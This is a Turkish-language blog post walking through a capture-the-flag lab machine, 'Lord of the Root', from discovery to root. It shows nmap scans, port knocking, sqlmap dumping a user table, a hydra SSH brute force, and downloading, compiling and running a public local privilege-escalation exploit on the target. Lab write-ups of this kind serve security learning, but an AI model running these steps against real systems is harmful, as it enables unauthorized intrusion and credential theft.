<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">

    <title>Lord of the Root</title>

    <!-- Bootstrap Core CSS -->
    <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">

    <!-- Theme CSS -->
    <link href="css/clean-blog.min.css" rel="stylesheet">

    <!-- Custom Fonts -->
    <link href="vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">
    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

</head>

<body>

    <!-- Navigation -->
    <nav style="background-color: black; opacity: 20%; margin-bottom: 10%;" class="navbar navbar-default navbar-custom navbar-fixed-top">
        <div class="container-fluid">
            <div class="navbar-header page-scroll">
                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
                    <span class="sr-only">Hüseyin Kavuncu</span>
                    Menu <i class="fa fa-bars"></i>
                </button>
                <a class="navbar-brand" href="index.html">Kavuncu</a>
            </div>

            
            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
               <ul class="nav navbar-nav navbar-right" style="padding-right: 11%;">
                     <li>
                        <a href="index.html">Home</a>
                    </li>
                    <li>
                        <a href="about.html">About</a>
                    </li>
                </ul>
            </div>
           
        </div>
        
    </nav>
    <!-- Page Header -->
    <!-- Set your background image for this header on the line below. -->
    <div style="margin-bottom: 3%;"></div>
    <header class="intro-header" style="background-image: url('img/lotr/LOTR.png'); height: 530px;">
        <div class="container">
            <div class="row">
                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                    <div class="post-heading">
                        
                        
                    </div>
                </div>
            </div>
        </div>
    </header>

    <!-- Post Content -->
    <article>
        <div class="container">
            <div class="row">
                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                    <h1 style="font-size: 45px;">Lord of the Root</h1>
                    <h2 class="subheading" style="font-size: 26px;">Lord of the Rings serisi hayranlarına bir çalışma makinesi Lord of the Root makinesinin çözümü.</h2>

                    <p>Merhabalar. Bu yazımda sizlerle Lord of the Root makinesini çözmeye çalışacağız. Lord of the Rings serisini okuyan ve filmlerini hayranlıkla izleyen birisi olarak bu makine çözümü oldukça heyecan vericiydi.</p>

                    <img src="img/lotr/160431.jpg" class="img-responsive" alt="">

                    <p>Bu güzel yapıta ait bir fotoğraf koymasam olmazdı. En temel karakterleri Legolas, Aragorn, Gimli, Gandalf ve Frodo olan bu yapıtta filmden birkaç ipucu olması lazım. Tabii ki bu benim görüşüm bakalım ne ile karşılaşacağız. </p>

                    <p>O zaman yavaş yavaş başlayalım. Her zaman ki gibi hedef makineyi tespit ederek başlayalım.</p>

                    <img src="img/lotr/1.png" class="img-responsive" alt="">
<br>
                    <p style="display: inline;"><code style="display: inline;">netdiscover </code> komutu ile;</p>

                    <p>Hedef makineyi tespit ediyoruz. Her zaman dediğim gibi öncelikle nereye saldıracağımızı bilmemiz gerekiyor.</p>

                    <p style="display: inline;"><code style="display: inline;">ifconfig</code> komutu ile;</p>

                    <p>Kendi IP adresimizi öğreniyoruz. Herhangi bir payload kullanacağımız zaman lazım olabilir. Ne kadar çok şey bilirsek sisteme/makineye sızmamız o kadar kolay olacaktır.</p>

                    <img src="img/lotr/2.png" class="img-responsive" alt="">
<br>
                    <p style="display: inline;"><code style="display: inline;">nmap -A 192.168.43.215 </code> komutu ile;</p>

                    <p>Agresif bir tarama yaptık. Zafiyetli bir makine olduğunu bildiğimiz için rahatça -A parametresini kullandık. Peki ne ile karşılaştık SSH portu açık. Hedef makine de Linux işletim sistemi çalışıyor. Elimizde sadece bir port var. Pek bir alternatifimiz yok yani. </p>

                    <img src="img/lotr/3.png" class="img-responsive" alt="">

                    <p>Evet bir ipucu bulduk işte. Güzel bir LOTR yazısının arkasında Knock Friend To Enter yazıyor. Yani girmek için arkadaşına çal/zilini çal/kapısını çal yazıyor. Sol altta da Easy as 1,2,3 yani 1,2,3 gibi kolay yazıyor. Belirli bir senaryo var biz onu izleyeceğiz galiba. Burada bizden port knocking işlemi yapmamızı istiyor.</p>
    
                    <p>Port knocking nedir? Aslında faal olan servislerin kapalı gibi gösterilmesi için kullanılan bir yöntemdir. Biz bu portlara(1,2,3) knock işlemi yaptığımızda aslında faal olan ama bizim nmap taramamızda göremediğimiz bir servis tekrar faal duruma gelecek. </p>

                    <img src="img/lotr/11.png" class="img-responsive" alt="">
<br>
                    <p style="display: inline;"><code style="display: inline;">apt-get install knockd</code> komutu ile;</p>

                    <p>Knock işlemini yapmam için kullanacağımız tool olan knockd’ı indiriyoruz.</p>
                    
                    <img src="img/lotr/12.png" class="img-responsive" alt="">
<br>
                    <p style="display: inline;"><code style="display: inline;">knock 192.168.43.215 1 2 3</code> komutu ile;</p>

                    <p>1,2 ve 3. portlara knock işlemi yapıyoruz ve hemen bir değişiklik var mı diye nmap taramasını tekrarlıyoruz.</p>

                    <p style="display: inline;"><code style="display: inline;">nmap -p- -sCV -A 192.168.43.215 </code> komutu ile;</p>

                    <p>Burada -p- parametresi bütün portları taramak için kullandığımız bir parametre. Servisin default dışında bir portta çalışma ihtimaline karşı kullanılan bir parametre. -sCV parametresi ise -sC ve -sV parametrelerinin kombinasyonu bir parametredir. -sC parametresi default script parametresidir. -sV parametresi ise servis/uygulama sürüm tespiti parametresidir. Bir arada kullandığımızda servis tespiti için default scriptler kullanıyor. </p>

                    <p>Parametreleri incelediğimize göre farklılıklara bakabiliriz artık. SSH portu açık, bir de 1337 http servisi açık. Hemen kontrol edelim.</p>

                    <img src="img/lotr/13.png" class="img-responsive" alt="">
<br>
                    <code style="display: inline;">192.168.43.215:1337 </code>

                    <p>Adresine gidiyoruz. Allah affetsin, bu kız kardeşimiz biraz sinirli galiba. “I will do it. I will take the ring into Mordor.” Diyor. Yani “Yapacağım. Yüzüğü Mordor’a götüreceğim.” Anlamına geliyor. Burada Mordor bir ipucu bence. Yani öyle olmalı source code’una baktım pek bir şey çıkaramadım açıkçası.</p>

                    <img src="img/lotr/15.png" class="img-responsive" alt="">
<br>
                    <code style="display: inline;">192.168.43.215:1337/mordor</code>
                    
                    <p>Adresine geldik ve bizi Frodo ve yoldaşı Sam karşılıyor. Filmden bir replik. “Sam, we can’t go this way. The black gate is too mainstream.” Burada bay Frodo “Sam bu yoldan da gidemeyiz. Siyah kapıda ana akım.” gibi bir şey diyor. Filmde burada Black Gate’e geliyor bu iki yoldaş ve Sauron’un ordusunun akına çıktığını ve bu kapıyı kullanan binlerce ork askeri olduğunu görüyor ve yönlerini değiştiriyor. Sanırım bizimde yön değiştirmemiz gerekiyor. Source code’a bakıyoruz.</p>

                    <img src="img/lotr/16.png" class="img-responsive" alt="">

                    <p>Evet burada bir ipucu daha bulduk. Hemen bu metni kopyalayıp alıyoruz.</p>

                    <img src="img/lotr/17.png" class="img-responsive" alt="">
<br>
                    <code>echo “THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh”|based64 –decode</code>

                    <p>Komutu ile base64 decode işlemi yapıyoruz. Closer! Yaklaştınız yazısını görüyoruz. Tekrar decode ediyoruz.</p>

                    <code>echo “Lzk3ODM0NTIxMC9pbmRleC5waHA” | base64 –decode</code>

                    <p>Komutu ile tekrar decode ettiğimizde evet sonuca ulaştık. Bize bir php uzantısı verdi. Hemen bunu da deniyoruz. </p>

                    <img src="img/lotr/18.png" class="img-responsive" alt="">
<br>
                    <code>192.168.43.215:1337/978345210/index.php</code>

                    <p>Adresine girdiğimizde bir login sayfası ile karşılaşıyoruz. </p>

                    <img src="img/lotr/34.jpg" class="img-responsive" alt="">
<br>
                    <code style="display: inline;">sqlmap -o -u http:// 192.168.43.215:1337/978345210/index.php --forms --dbs</code>

                    <p>Bu komutu kullanarak sqlmap tool’u yardımı ile bu form arkasında kullanılan sql database’ini tespit ediyoruz. Dört farklı database tespit edildi. Webapp database’ini kontrol edelim.</p>

                    <img src="img/lotr/31.jpg" class="img-responsive" alt="">
<hr>
                    <code style="display: inline;">sqlmap -u http:// 192.168.43.215:1337/978345210/index.php --forms -D Webapp --tables</code><p style="display: inline;"> komutu ile;</p>

                    <p>Webapp database’inde yer alan tabloları kontrol ediyoruz. Users diye bir tablo var. Aradığımız şey bu olsa gerek.</p>

                    <img src="img/lotr/32.jpg" class="img-responsive" alt="">
<hr>
                    <code style="display: inline;">sqlmap -u http:// 192.168.43.215:1337/978345210/index.php --forms -D Webapp -T Users --columns </code><p style="display: inline;"> komutu ile;</p>

                    <p>Webapp database’inde bulunan Users tablosunun sütunlarını(columns) taradık. Üç adet sütun bulunmaktadır. id, password, username ve bunların tip bilgileride geldi. </p>
                    
                    <img src="img/lotr/33.jpg" class="img-responsive" alt="">
<hr>
                    <code style="display: inline;">sqlmap -u http:// 192.168.43.215:1337/978345210/index.php --forms -D Webapp -T Users -C id,username,password --dump </code><p style="display: inline;"> komutu ile;</p>

                    <p>Webapp database’inin Users tablosunun id, username ve password sütunlarını tarıyoruz. 5 kullanıcıya ait kullanıcı adı ve şifreye ulaşmış olduk.</p>

                    <img src="img/lotr/37.png" class="img-responsive" alt="">
<hr>
                    <code style="display: inline;">192.168.43.215:1337/978345210/index.php</code>

                    <p>Adresine gittim ve hemen bir kullanıcı adı ve şifre denedim. Başarılı bir şekilde giriş yapmış oldum tabii ki ama açılan 192.168.43.215:1337/978345210/profile.php sayfasını görünce yanlış giden bir şeyler olduğunu düşünmeye başladım. Source code’unu incelediğimde de bir ipucu ile karşılaşmadım.</p>

                    <p>Burada elimizde beş kullanıcı ve bunların profile.php için kullandıkları 5 adet parola var. Bu kullanıcılar SSH bağlantısı için acaba aynı parolayı mı kullanıyorlar?</p>

                    <img src="img/lotr/38.png" class="img-responsive" alt="">
<hr>
                    <p>Burada sqlmap in verdiği csv dosyasını açtım ve kendime bir adet usr.txt ve bir adet de pass.txt oluşturdum. Bu şifreler ile BruteForce atacağız. Olmazsa bir passlist.txt deneyeceğiz.</p>

                    <img src="img/lotr/39.png" class="img-responsive" alt="">
<hr>
                    <code style="display: inline;">hydra -L /root/Desktop/lotr/usr -P /root/Desktop/lotr/pass ssh://192.168.43.215 </code><p style="display: inline;"> komutu ile;</p>

                    <p>Hydra aracını kullanarak BruteForce atıyoruz. Burada kendi oluşturduğum dosyaların dizinlerini verdim ssh ile hangi IP adresine saldırı yapılacağını belirledim. Bizim gollum arkadaşımız Smeagol SSH bağlantısı yapabiliyor ve şifresi de database’de tespit ettiğimiz şifre ile aynı.</p>

                    <img src="img/lotr/40.png" class="img-responsive" alt="">
<hr>
                    <code>ssh smeagol@192.168.43.215</code>

                    <p>Teşekkürler gollum kardeş. Sanırım artık makine içerisine girmiş bulunmaktayız.</p>

                    <img src="img/lotr/41.png" class="img-responsive" alt="">
<hr>
                    <code style="display: inline;">ls</code><p style="display: inline;"> komutu ile;</p>

                    <p>Hemen bir ipucu daha aradım fakat bir şey bulamadım. Peki yetki yükseltebileceğimiz bir uygulama var mı diye bakıyorum hemen.</p>

                    <code style="display: inline;">find / -perm -4000 2>/dev/null</code>

                    <p>Maalesef yetki yükseltmek için kullanabileceğim bir uygulama göremedim. Eğer siz gördüyseniz bana bunu bildirebilirsiniz. Benim dikkatimi sadece SECRET klasörü ve içerisinde bulunan door1, door2 ve door3 klasörleri çekti.</p>

                    <img src="img/lotr/42.png" class="img-responsive" alt="">

                    <p>Dosyaların içerisinde birer file dosyası var. </p>

                    <code style="display: inline;">file file</code><p style="display: inline;"> komutu ile;</p>

                    <p>Dosya yapılarını kontrol ediyorum. Bu üç dosyada executable, yani yürütülebilir ve string input alan dosyalar. Dosyaların boyutlarını karşılaştırıyorum hemen.</p>

                    <code>du -b door1/file door2/file door3/file</code>

                    <p>Burada byte cinsinden boyutlarını elde ettik ve door1 klasöründe bulunan file dosyası diğer iki dosyadan farklı. </p>

                    <img src="img/lotr/43.png" class="img-responsive" alt="">
<hr>
                    <code style="display: inline;">cp door1/file /home/smeagol/buffer </code><p style="display: inline;"> komutu ile;</p>

                    <p>Üzerinde rahatça çalışmak için bir kopyasını alıyorum.</p>

                    <code style="display: inline;">./buffer $(python -c “print ‘a’*300”) </code> <p style="display: inline;">ve diğer komutlar ile;</p>

                    <p>Aldığım bu kopyayı belirli karakter uzunluğunda stringler ile çalıştırdım. Bunu </p>

                    <code>./buffer aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.. </code>
                    
                    <p>Şeklinde de yapabiliriniz ama ben bu şekilde kısa bir script ile yapma taraftarıyım. Siber güvenlik alanında ilgilenirken python bilmenin büyük faydaları olduğunu söylemiş bulunayım bu arada.</p>

                    <p>Yaptığımız işlemde 170 adet char karakter aldığını 171’inci char karakter geldiğinde buffer overflow oldu. Ara bellek aşımı da diyebiliriz. Peki buffer overflow nedir? Buffer overflow bir bardaktan suyun taşmasına benzetebiliriz. Programda belirlenmiş bir belleğe, kapasitesinden fazla veri atamasında bulunursak(5 limitli bir stack için 6. veriyi push yaparsak gibi) ortaya çıkan bir bellek taşması zafiyetidir.</p>

                    <p>Bu işlem uzayacak gibi derken aklıma bir fikir daha geldi. İşletim sistemimiz Linux. Belki bunu kullanabiliriz</p>

                    <img src="img/lotr/51.png" class="img-responsive" alt="">
<hr>
                    <code style="display: inline;">uname –all</code><p style="display: inline;"> komutu ile;</p>

                    <p>İşletim sistemi hakkında biraz daha fazla bilgi ediniyoruz. Ubuntu 14.</p>

                    <img src="img/lotr/50.png" class="img-responsive" alt="">
<hr>
                    <code style="display: inline;">searchsploit ubuntu 14</code><p style="display: inline;"> komutu ile;</p>

                    <p>Buradan uygun exploit’i seçiyoruz. Burada “Local Privilege Escalation” dikkatimizi çekiyor. “Yerel Ayrıcalık Yükselmesi” anlamına geliyor. Bunu kullanabiliriz bence.</p>

                    <img src="img/lotr/52.png" class="img-responsive" alt="">

                    <p>39166 exploit numarısını exploit-db.com üzerinden aratıyoruz ve download adres uzantısını alıyoruz.</p>

                    <img src="img/lotr/53.png" class="img-responsive" alt="">
<hr>
                    <code style="display: inline;">wget https://www.exploit-db.com/download/39166</code><p style="display: inline;"> komutu ile;</p>

                    <p>Hedef makine üzerine exploit kurulumunu yapıyoruz.</p>

                    <code style="display: inline;">ls -all</code><p style="display: inline;"> komutu ile;</p>

                    <p>Dosyaları kontrol ediyoruz ve göründüğü üzere başarılı bir şekilde dosyamız hazır ve nazır beklemekte.</p>

                    <img src="img/lotr/54.png" class="img-responsive" alt="">
<hr>
                    <code style="display: inline;">file 39166</code><p style="display: inline;"> komutu ile;</p>
                    
                    <p>Dosya yapısını inceliyoruz. C source bir dosya. Yani C derleme işlemi yapacağız. Bunun için dosya ismini 39166.c olarak değiştirdim. Bunun içinde </p>

                    <code style="display: inline;">mv 39166 39166.c</code><p style="display: inline;"> Linux komutunu kullanıyoruz.</p>

                    <code style="display: inline;">gcc 39166.c -o privesc </code><p style="display: inline;">komutu;</p>

                    <p>Bu komut ile derleme işlemini yapıyoruz. Linux üzerinde C dilini kullanan arkadaşlar bu komuta aşinadır. Ben yine de açıklayayım. gcc komutu c dili derleme komutudur. Bu komuttan sonra derlenecek dosya verilir. -o parametresi derlenmiş executable dosya adını belirlememizi sağlar. Biz privesc adında derleme işlemini tamamladık.</p>

                    <p>Geriye sadece bu dosyayı çalıştırmak yapmak gerekiyor.</p>

                    <code style="display: inline;">./privesc</code>

                    <p>Bir şeyler oldu.</p>

                    <code>whoami</code>

                    <code>root</code>

                    <p>Artık root yetkisini aldık. Yeni makineniz hayırlı uğurlu olsun.</p>

                    <a href="index.html">
                        <span style="color: black; opacity: 50%; padding-left: 38%;" class="meta">Posted by <a href="index.html">Hüseyin KAVUNCU</a> on April 29, 2020</span>
                    </a>

                </div>
            </div>
        </div>
    </article>

    <hr>

    <!-- Footer -->
    <footer>
        <div class="container">
            <div class="row">
                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                    <ul class="list-inline text-center">
                        <li>
                            <a href="https://www.instagram.com/kavuncu_azade_">
                                <span class="fa-stack fa-lg">
                                    <i class="fa fa-circle fa-stack-2x"></i>
                                    <i class="fa fa-instagram fa-stack-1x fa-inverse"></i>
                                </span>
                            </a>
                        </li>
                        <li>
                            <a href="https://www.linkedin.com/in/h%C3%BCseyin-kavuncu-664485177">
                                <span class="fa-stack fa-lg">
                                    <i class="fa fa-circle fa-stack-2x"></i>
                                    <i class="fa fa-linkedin fa-stack-1x fa-inverse"></i>
                                </span>
                            </a>
                        </li>
                        <li>
                            <a href="https://github.com/esasadam06">
                                <span class="fa-stack fa-lg">
                                    <i class="fa fa-circle fa-stack-2x"></i>
                                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
                                </span>
                            </a>
                        </li>
                        <li>
                            <a href="mailto:hsynkavuncu.6@gmail.com">
                                <span class="fa-stack fa-lg">
                                    <i class="fa fa-circle fa-stack-2x"></i>
                                    <i class="fa fa-envelope fa-stack-1x fa-inverse"></i>
                                </span>
                            </a>
                        </li>
                    </ul>
               
                </div>
            </div>
        </div>
    </footer>

    <!-- jQuery -->
    <script src="vendor/jquery/jquery.min.js"></script>

    <!-- Bootstrap Core JavaScript -->
    <script src="vendor/bootstrap/js/bootstrap.min.js"></script>

    <!-- Contact Form JavaScript -->
    <script src="js/jqBootstrapValidation.js"></script>
    <script src="js/contact_me.js"></script>

    <!-- Theme JavaScript -->
    <script src="js/clean-blog.min.js"></script>

</body>

</html>
